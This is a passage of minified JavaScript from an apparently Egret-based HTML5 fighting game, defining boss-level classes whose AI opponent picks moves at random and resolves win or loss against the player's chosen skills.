        4 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_3()) : 8 >= b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_2()) : 0 > this.Ai_power() -
        1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("senior_block"), this.Ai_player.play(), this.outcome_5())
    };
    d.prototype.another = function (b) {
        3 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_3()) : 6 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : 8 >= b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_2()) : 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4())
    };
    d.prototype.loser =
        function () {
            var b = this;
            Main.fuckyou = 1;
            egret.Tween.get(this).wait(1E3).call(function () {
                b.prompt.text = "\u60a8\u5931\u8d25\u4e86...";
                for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
                egret.Tween.get(b).wait(1E3).call(function () {
                    b.removeChildren();
                    var a = new Over("fail");
                    b.addChild(a)
                })
            })
        };
    d.prototype.winner = function () {
        var b = this;
        Main.fuckyou = 2;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u6218\u80dc\u4e86\u5bf9\u624b...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("success");
                b.addChild(a);
                ih5game.storage.get("threeAi") || ih5game.storage.set("threeAi", "true")
            })
        })
    };
    d.prototype.onEnterFrame = function () {
        var b = this;
        if (this.second_bout && this.second_Tap) {
            this.second_Tap = this.second_bout = !1;
            var a = Common.c_random(0, 10);
            this.getProbability(a, this.symbol);
            this.symbol++;
            egret.Tween.get(this).wait(1500).call(function () {
                b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
                b.Ai_player.play()
            })
        }
    };
    d.prototype.log = function () {
        var b =
            this;
        this.prompt.visible || (this.prompt.visible = !0);
        this.prompt.text = "Power\u4e0d\u8db3...";
        egret.Tween.get(this.prompt).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            b.global_bout = !0;
            b.player.movieClipData = b.mcFactory.generateMovieClipData("stand");
            b.player.play();
            b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
            b.Ai_player.play();
            b.storage_Bool = !1;
            b.base_block_Bool = !1;
            b.senior_block_Bool = !1;
            b.qi_gong_Bool = !1;
            b.black_dragon_Bool = !1;
            b.sickle_Bool = !1;
            b.thunder_Bool = !1;
            b.vigour_Bool = !1
        })
    };
    d.prototype.triggerBaseBlock = function () {
        var b = this;
        this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u57fa\u7840\u683c\u6321...";
        this.player.movieClipData = this.mcFactory.generateMovieClipData("base_block");
        this.player.play();
        this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : this.second_bout ||
        (this.second_bout = !0);
        egret.Tween.get(this.prompt).wait(1500).call(function () {
            b.backToStand();
            1 != b.sign || b.second_bout || (b.second_bout = !0)
        })
    };
    d.prototype.backToStand = function () {
        for (var b = this, a = 0; 8 > a; a++)this.skill_arr[a].touchEnabled = !0;
        this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool = this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.global_bout = !0;
        this.player.movieClipData = this.mcFactory.generateMovieClipData("stand");
        this.player.play();
        this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("stand");
        this.Ai_player.play();
        egret.Tween.get(this).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f..."
        })
    };
    d.prototype.judge = function () {
        this.first_bout || this.second_bout || (this.second_bout = !0)
    };
    d.prototype.addPower = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.storage_Bool = !0;
        this.global_bout && (this.prompt.visible || (this.prompt.visible = !0), this.global_bout = !1, this.prompt.text =
            "\u50a8\u5b58\u80fd\u91cf\u4e2d...", this.power_point_l.text = this.player_power() + 1 + "", this.player.movieClipData = this.mcFactory.generateMovieClipData("storage"), this.player.play(), this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : (this.second_bout || (this.second_bout = !0), this.second_bout && (this.second_Tap = !0)), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.global_bout = !0;
            a.backToStand();
            1 != a.sign || a.second_bout || (a.second_bout = !0)
        }))
    };
    d.prototype.base_block = function (b) {
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.base_block_Bool = !0;
        this.judge();
        this.second_bout && (this.second_Tap = !0);
        this.global_bout && (this.global_bout = !1, this.triggerBaseBlock())
    };
    d.prototype.senior_block = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.senior_block_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_senior = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ad8\u7ea7\u683c\u6321...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("senior_block"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_senior = !1, this.log())
    };
    d.prototype.QiGong = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.qi_gong_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_qiQ = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u6c14\u529f\u6ce2...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("Qigong"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_qiQ = !1, this.log())
    };
    d.prototype.black_dragon = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.black_dragon_Bool = !0;
        this.judge();
        3 <= this.player_power() ? (this.second_bout &&
        (this.second_Tap = !0), this.enough_blackDragon = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ed1\u9f99\u529f...", this.power_point_l.text = this.minus(3), this.player.movieClipData = this.mcFactory.generateMovieClipData("black_dragon"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_blackDragon = !1, this.log())
    };
    d.prototype.sickle = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.sickle_Bool = !0;
        this.judge();
        4 <= this.player_power() ?
            (this.second_bout && (this.second_Tap = !0), this.enough_sickle = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9570\u5200\u65a9...", this.power_point_l.text = this.minus(4), this.player.movieClipData = this.mcFactory.generateMovieClipData("sickle"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_sickle = !1, this.log())
    };
    d.prototype.thunder = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.thunder_Bool = !0;
        this.judge();
        5 <= this.player_power() ?
            (this.second_bout && (this.second_Tap = !0), this.enough_thunder = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u96f7\u5f39...", this.power_point_l.text = this.minus(5), this.player.movieClipData = this.mcFactory.generateMovieClipData("mine"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_thunder = this.second_Tap = !1, this.log())
    };
    d.prototype.vigour = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.vigour_Bool = !0;
        this.judge();
        8 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_vigour = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u5143\u6c14\u5f39...", this.power_point_l.text = this.minus(8), this.player.movieClipData = this.mcFactory.generateMovieClipData("vigour"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_vigour = !1, this.log())
    };
    d.prototype.player_power = function () {
        return parseInt(this.power_point_l.text)
    };
    d.prototype.Ai_power = function () {
        return parseInt(this.power_point_r.text)
    };
    d.prototype.minus = function (b) {
        return parseInt(this.power_point_l.text) - b + ""
    };
    return d
}(Game);
Login_2.prototype.__class__ = "Login_2";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Login_3 = function (c) {
    function d() {
        c.call(this);
        this.first_bout = this.global_bout = !0;
        this.second_bout = !1;
        this.sign = 0;
        this.second_Tap = this.enough_vigour = this.enough_thunder = this.enough_sickle = this.enough_blackDragon = this.enough_qiQ = this.enough_senior = this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool =
            this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.symbol = 2;
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this)
    }

    __extends(d, c);
    d.prototype.onLoadStage = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this);
        var b = RES.getRes("player_json"), a = RES.getRes("player_png");
        this.mcFactory = new egret.MovieClipDataFactory(b, a);
        this.player = new egret.MovieClip(this.mcFactory.generateMovieClipData("stand"));
        this.player.x = 20 * Main.sFactor + this.player.width /
        2 * Main.sFactor;
        this.player.y = 538 * Main.sFactor + this.player.height / 2 * Main.sFactor;
        this.player.scaleX = this.player.scaleY = Main.sFactor;
        b = RES.getRes("boss_3_json");
        a = RES.getRes("boss_3_png");
        this.AiFactory = new egret.MovieClipDataFactory(b, a);
        this.Ai_player = new egret.MovieClip(this.AiFactory.generateMovieClipData("stand"));
        this.Ai_player.x = 0.88 * Main.stageW;
        this.Ai_player.y = 538 * Main.sFactor + this.Ai_player.height / 2 * Main.sFactor;
        this.Ai_player.scaleX = this.Ai_player.scaleY = Main.sFactor;
        this.addChild(this.Ai_player);
        this.addChild(this.player);
        this.prompt = new Prompt;
        this.addChild(this.prompt);
        this.stage.addEventListener(egret.Event.ENTER_FRAME, this.onEnterFrame, this)
    };
    d.prototype.getProbability = function (b, a) {
        switch (a) {
            case 2:
                this.second(b);
                break;
            case 3:
                this.three(b);
                break;
            case 4:
                this.four(b);
                break;
            default:
                this.other(b)
        }
    };
    d.prototype.outcome_1 = function () {
        this.base_block_Bool || this.qi_gong_Bool || (this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior && this.loser() : this.sickle_Bool ? this.enough_sickle &&
        this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_2 = function () {
        this.base_block_Bool || this.qi_gong_Bool || this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon &&
        this.winner())
    };
    d.prototype.outcome_3 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner()))
    };
    d.prototype.outcome_4 = function () {
        this.base_block_Bool ? this.loser() : this.qi_gong_Bool ? this.loser() : this.storage_Bool ?
            this.loser() : this.senior_block_Bool ? this.enough_senior || this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool && this.enough_thunder && this.winner()
    };
    d.prototype.allot = function () {
        Common.c_random(0, 2) ? this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block") : (this.power_point_r.text = this.player_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"));
        this.Ai_player.play()
    };
    d.prototype.second = function (b) {
        5 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : 9 == b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"),
            this.Ai_player.play(), this.outcome_2())
    };
    d.prototype.three = function (b) {
        5 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.four = function (b) {
        3 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) :
            7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.other = function (b) {
        2 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text =
            this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 5 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text =
            this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.loser = function () {
        var b = this;
        Main.fuckyou = 2;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u5931\u8d25\u4e86...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("fail");
                b.addChild(a)
            })
        })
    };
    d.prototype.winner = function () {
        var b = this;
        Main.fuckyou = 3;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text =
                "\u60a8\u6218\u80dc\u4e86\u5bf9\u624b...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("success");
                b.addChild(a);
                ih5game.storage.get("fourAi") || ih5game.storage.set("fourAi", "true")
            })
        })
    };
    d.prototype.onEnterFrame = function () {
        var b = this;
        if (this.second_bout && this.second_Tap) {
            this.second_Tap = this.second_bout = !1;
            var a = Common.c_random(0, 10);
            this.getProbability(a, this.symbol);
            this.symbol++;
            egret.Tween.get(this).wait(1500).call(function () {
                b.Ai_player.movieClipData =
                    b.AiFactory.generateMovieClipData("stand");
                b.Ai_player.play()
            })
        }
    };
    d.prototype.log = function () {
        var b = this;
        this.prompt.visible || (this.prompt.visible = !0);
        this.prompt.text = "Power\u4e0d\u8db3...";
        egret.Tween.get(this.prompt).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            b.global_bout = !0;
            b.player.movieClipData = b.mcFactory.generateMovieClipData("stand");
            b.player.play();
            b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
            b.Ai_player.play();
            b.storage_Bool = !1;
            b.base_block_Bool = !1;
            b.senior_block_Bool = !1;
            b.qi_gong_Bool = !1;
            b.black_dragon_Bool = !1;
            b.sickle_Bool = !1;
            b.thunder_Bool = !1;
            b.vigour_Bool = !1
        })
    };
    d.prototype.triggerBaseBlock = function () {
        var b = this;
        this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u57fa\u7840\u683c\u6321...";
        this.player.movieClipData = this.mcFactory.generateMovieClipData("base_block");
        this.player.play();
        this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : this.second_bout || (this.second_bout = !0);
        egret.Tween.get(this.prompt).wait(1500).call(function () {
            b.backToStand();
            1 != b.sign || b.second_bout || (b.second_bout = !0)
        })
    };
    d.prototype.backToStand = function () {
        for (var b = this, a = 0; 8 > a; a++)this.skill_arr[a].touchEnabled = !0;
        this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool = this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.global_bout = !0;
        this.player.movieClipData = this.mcFactory.generateMovieClipData("stand");
        this.player.play();
        this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("stand");
        this.Ai_player.play();
        egret.Tween.get(this).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f..."
        })
    };
    d.prototype.judge = function () {
        this.first_bout || this.second_bout || (this.second_bout = !0)
    };
    d.prototype.addPower = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.storage_Bool = !0;
        this.global_bout &&
        (this.prompt.visible || (this.prompt.visible = !0), this.global_bout = !1, this.prompt.text = "\u50a8\u5b58\u80fd\u91cf\u4e2d...", this.power_point_l.text = this.player_power() + 1 + "", this.player.movieClipData = this.mcFactory.generateMovieClipData("storage"), this.player.play(), this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : (this.second_bout || (this.second_bout = !0), this.second_bout &&
        (this.second_Tap = !0)), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.global_bout = !0;
            a.backToStand();
            1 != a.sign || a.second_bout || (a.second_bout = !0)
        }))
    };
    d.prototype.base_block = function (b) {
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.base_block_Bool = !0;
        this.judge();
        this.second_bout && (this.second_Tap = !0);
        this.global_bout && (this.global_bout = !1, this.triggerBaseBlock())
    };
    d.prototype.senior_block = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.senior_block_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_senior = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ad8\u7ea7\u683c\u6321...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("senior_block"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_senior = !1, this.log())
    };
    d.prototype.QiGong = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.qi_gong_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_qiQ = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u6c14\u529f\u6ce2...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("Qigong"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_qiQ = !1, this.log())
    };
    d.prototype.black_dragon = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.black_dragon_Bool = !0;
        this.judge();
        3 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_blackDragon = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ed1\u9f99\u529f...", this.power_point_l.text = this.minus(3), this.player.movieClipData = this.mcFactory.generateMovieClipData("black_dragon"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_blackDragon = !1, this.log())
    };
    d.prototype.sickle = function (b) {
        var a = this;
        for (b = 0; 8 >
        b; b++)this.skill_arr[b].touchEnabled = !1;
        this.sickle_Bool = !0;
        this.judge();
        4 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_sickle = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9570\u5200\u65a9...", this.power_point_l.text = this.minus(4), this.player.movieClipData = this.mcFactory.generateMovieClipData("sickle"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_sickle = !1, this.log())
    };
    d.prototype.thunder = function (b) {
        var a =
            this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.thunder_Bool = !0;
        this.judge();
        5 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_thunder = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u96f7\u5f39...", this.power_point_l.text = this.minus(5), this.player.movieClipData = this.mcFactory.generateMovieClipData("mine"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_thunder = this.second_Tap = !1, this.log())
    };
    d.prototype.vigour =
        function (b) {
            var a = this;
            for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
            this.vigour_Bool = !0;
            this.judge();
            8 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_vigour = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u5143\u6c14\u5f39...", this.power_point_l.text = this.minus(8), this.player.movieClipData = this.mcFactory.generateMovieClipData("vigour"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_vigour = !1, this.log())
        };
    d.prototype.player_power =
        function () {
            return parseInt(this.power_point_l.text)
        };
    d.prototype.Ai_power = function () {
        return parseInt(this.power_point_r.text)
    };
    d.prototype.minus = function (b) {
        return parseInt(this.power_point_l.text) - b + ""
    };
    return d
}(Game);
Login_3.prototype.__class__ = "Login_3";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Login_4 = function (c) {
    function d() {
        c.call(this);
        this.first_bout = this.global_bout = !0;
        this.second_bout = !1;
        this.sign = 0;
        this.second_Tap = this.enough_vigour = this.enough_thunder = this.enough_sickle = this.enough_blackDragon = this.enough_qiQ = this.enough_senior = this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool =
            this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.symbol = 2;
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this)
    }

    __extends(d, c);
    d.prototype.onLoadStage = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this);
        var b = RES.getRes("player_json"), a = RES.getRes("player_png");
        this.mcFactory = new egret.MovieClipDataFactory(b, a);
        this.player = new egret.MovieClip(this.mcFactory.generateMovieClipData("stand"));
        this.player.x = 20 * Main.sFactor + this.player.width /
        2 * Main.sFactor;
        this.player.y = 538 * Main.sFactor + this.player.height / 2 * Main.sFactor;
        this.player.scaleX = this.player.scaleY = Main.sFactor;
        b = RES.getRes("boss_4_json");
        a = RES.getRes("boss_4_png");
        this.AiFactory = new egret.MovieClipDataFactory(b, a);
        this.Ai_player = new egret.MovieClip(this.AiFactory.generateMovieClipData("stand"));
        this.Ai_player.x = 0.88 * Main.stageW;
        this.Ai_player.y = 538 * Main.sFactor + this.Ai_player.height / 2 * Main.sFactor;
        this.Ai_player.scaleX = this.Ai_player.scaleY = Main.sFactor;
        this.addChild(this.Ai_player);
        this.addChild(this.player);
        this.prompt = new Prompt;
        this.addChild(this.prompt);
        this.stage.addEventListener(egret.Event.ENTER_FRAME, this.onEnterFrame, this)
    };
    d.prototype.getProbability = function (b, a) {
        switch (a) {
            case 2:
                this.second(b);
                break;
            case 3:
                this.three(b);
                break;
            case 4:
                this.four(b);
                break;
            case 5:
                this.five(b);
                break;
            case 6:
                this.sixth(b);
                break;
            default:
                this.another(b)
        }
    };
    d.prototype.outcome_1 = function () {
        this.base_block_Bool || this.qi_gong_Bool || (this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior &&
        this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_2 = function () {
        this.base_block_Bool || this.qi_gong_Bool || this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() :
        this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_3 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner()))
    };
    d.prototype.outcome_4 = function () {
        this.base_block_Bool ? this.loser() :
            this.qi_gong_Bool ? this.loser() : this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior || this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool && this.enough_thunder && this.winner()
    };
    d.prototype.outcome_5 = function () {
        this.base_block_Bool ? this.loser() : this.qi_gong_Bool ? this.loser() : this.storage_Bool ? this.loser() : this.senior_block_Bool || this.sickle_Bool || (this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ?
        this.enough_thunder && this.winner() : this.black_dragon_Bool && this.loser())
    };
    d.prototype.outcome_6 = function () {
        this.base_block_Bool ? this.loser() : this.qi_gong_Bool ? this.loser() : this.storage_Bool ? this.loser() : this.senior_block_Bool || (this.sickle_Bool ? this.loser() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool || this.black_dragon_Bool && this.loser())
    };
    d.prototype.outcome_7 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool ||
        this.sickle_Bool || this.vigour_Bool && this.enough_vigour && this.winner())
    };
    d.prototype.allot = function () {
        Common.c_random(0, 2) ? this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block") : (this.power_point_r.text = this.player_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"));
        this.Ai_player.play()
    };
    d.prototype.second = function (b) {
        5 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : 8 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.three = function (b) {
